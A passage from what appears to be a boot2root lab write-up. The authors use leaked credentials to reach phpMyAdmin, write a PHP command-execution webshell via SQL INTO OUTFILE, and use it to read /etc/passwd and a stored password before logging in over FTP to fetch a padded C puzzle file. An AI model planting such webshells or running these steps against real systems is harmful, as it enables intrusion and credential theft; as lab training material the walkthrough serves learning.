Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

Now we have a username and password for the database;

```
root - Fg-'kKXBj87E:aJ$
```

So now let's connect to the database and see what we find;

```
192.168.193.128/phpmyadmin
```


When we browsed the database a bit, we looked at the user list and other things here, but nothing much caught our attention, the passwords were kept hashed.

We then decided to use webshell exploit.

```
luji~:dirb https://192.168.193.128/forum

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Tue Apr  8 12:08:12 2025
URL_BASE: https://192.168.193.128/forum/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.193.128/forum/ ----
+ https://192.168.193.128/forum/backup (CODE:403|SIZE:296)
+ https://192.168.193.128/forum/config (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.193.128/forum/images/
==> DIRECTORY: https://192.168.193.128/forum/includes/
+ https://192.168.193.128/forum/index (CODE:200|SIZE:4935)
+ https://192.168.193.128/forum/index.php (CODE:200|SIZE:4935)
==> DIRECTORY: https://192.168.193.128/forum/js/
==> DIRECTORY: https://192.168.193.128/forum/lang/
==> DIRECTORY: https://192.168.193.128/forum/modules/
==> DIRECTORY: https://192.168.193.128/forum/templates_c/
==> DIRECTORY: https://192.168.193.128/forum/themes/
==> DIRECTORY: https://192.168.193.128/forum/update/

---- Entering directory: https://192.168.193.128/forum/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://192.168.193.128/forum/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://192.168.193.128/forum/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://192.168.193.128/forum/lang/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://192.168.193.128/forum/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://192.168.193.128/forum/templates_c/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://192.168.193.128/forum/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://192.168.193.128/forum/update/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Tue Apr  8 12:08:18 2025
DOWNLOADED: 4612 - FOUND: 4
```

When we tried to upload files based on the results, we encountered problems except for the "/forum/templates_c/" part

```SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/webshell.php"```

We added a backdoor to our website.

In brief:

- **`<?php system($_GET['cmd']); ?>`**: This PHP code is used to execute commands sent via the `cmd` parameter in the URL on the server. For example, commands can be executed on the server with a request like `http://site.com/webshell.php?cmd=ls`.
- **`into outfile`**: In SQL, this command writes the result of the query to the specified file path.
- **`/var/www/forum/templates_c/webshell.php`**: This is where we will upload the file.

Now let's see what we can find on the server with the backdoor we added.

```
view-source:https://192.168.193.128/forum/templates_c/webshell.php?cmd=whoami

www-data
```



```
view-source:https://192.168.193.128/forum/templates_c/webshell.php?cmd=cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```

Here we only noticed one user with the format **`laurie@borntosec.net`**. We made a note to think about whether we could do anything with having a user with special characters like @ later.

Then we go to the /home directory to see what files are on our server.

```
view-source:https://192.168.193.128/forum/templates_c/webshell.php?cmd=ls -la /home


total 0
drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
drwxr-xr-x 1 root                 root                 200 Apr  8  2025 ..
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
```

The first thing that caught our attention here was:
**`drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME`**

That's it.

To see what's in the folder:

```
view-source:https://192.168.193.128/forum/templates_c/webshell.php?cmd=ls%20-la%20/home/LOOKATME



total 1
drwxr-x--- 2 www-data www-data  31 Oct  8  2015 .
drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
-rwxr-x--- 1 www-data www-data  25 Oct  8  2015 password
```

```
view-source:https://192.168.193.128/forum/templates_c/webshell.php?cmd=file%20/home/LOOKATME/password


/home/LOOKATME/password: ASCII text

```

So let's see what our password is.

```
view-source:https://192.168.193.128/forum/templates_c/webshell.php?cmd=cat%20/home/LOOKATME/password



lmezard:G!@M6f4Eatau{sF"
```

Yes, we got our password. Let's see where we can use it.

Remember:

```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

We obtained these at the beginning of the project.

When we tried our username and password over SSH, we noticed it didn't work, but it works over FTP.

Also

```
view-source:https://192.168.193.128/forum/templates_c/webshell.php?cmd=cat%20/etc/ssh/sshd_config`


[***]

AllowUsers ft_root zaz thor laurie

[***]

```
When we examine with **`cat /etc/ssh/sshd_config`**, we can see that only users **`ft_root zaz thor laurie`** can connect via SSH.

Anyway, let's connect to our server via FTP.

```
lmezard:G!@M6f4Eatau{sF"
```

```
PS C:\Users\Admin> ftp 192.168.193.128
Connected to 192.168.193.128.
220 Welcome on this server
200 Always in UTF8 mode.
User (192.168.193.128:(none)): lmezard
331 Please specify the password.
Password:

230 Login successful.
ftp>
```


```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
README
fun
226 Directory send OK.
ftp: 16 bytes received in 0.00Seconds 16000.00Kbytes/sec.
```

We see two files here: **`README and fun`** and we download them to our computer.

```
get README
get fun
```

Later we read the README.

```
PS C:\Users\Admin\Desktop> cat README

Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

Now let's solve our little challenge.

```
luji/mnt/c/Users/Admin/Desktop:file fun
fun: POSIX tar archive (GNU)
```

When we open this rar archive, we see a folder named **`ft_fun`** containing 750 **`.pcap`** files.

We notice that one of them has a larger byte value than the others.

```
[***]
-rwxrwxrwx 1 luji    44 Aug 13  2015 BI0RD.pcap
-rwxrwxrwx 1 luji 32096 Aug 13  2015 BJPCP.pcap
-rwxrwxrwx 1 luji    43 Aug 13  2015 BN32A.pcap
[***]
```

We wanted to examine this directly and when we opened it, we found:


```
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
} */
char getme8() {
	return 'w';
}
/*
void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}*/
char getme9() {
	return 'n';
}
/*
void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}*/
char getme10() {
	return 'a';
}
/*
void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}*/
char getme11() {
	return 'g';
}
/*
void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}*/
char getme12()
{
	return 'e';
}
/*
void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}*/
int main() {
	printf("M");
	printf("Y");
	printf(" ");
	printf("P");
	printf("A");
	printf("S");
	printf("S");
	printf("W");
	printf("O");
	printf("R");
	printf("D");
	printf(" ");
	printf("I");
	printf("S");
	printf(":");
	printf(" ");
	printf("%c",getme1());
	printf("%c",getme2());
	printf("%c",getme3());
	printf("%c",getme4());
	printf("%c",getme5());
	printf("%c",getme6());
	printf("%c",getme7());
	printf("%c",getme8());
	printf("%c",getme9());
	printf("%c",getme10());
	printf("%c",getme11());
	printf("%c",getme12());
	printf("\n");
	printf("Now SHA-256 it and submit");
}
/*
void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
	printf("Hahahaha Got you!!!\n");
}void useless() {
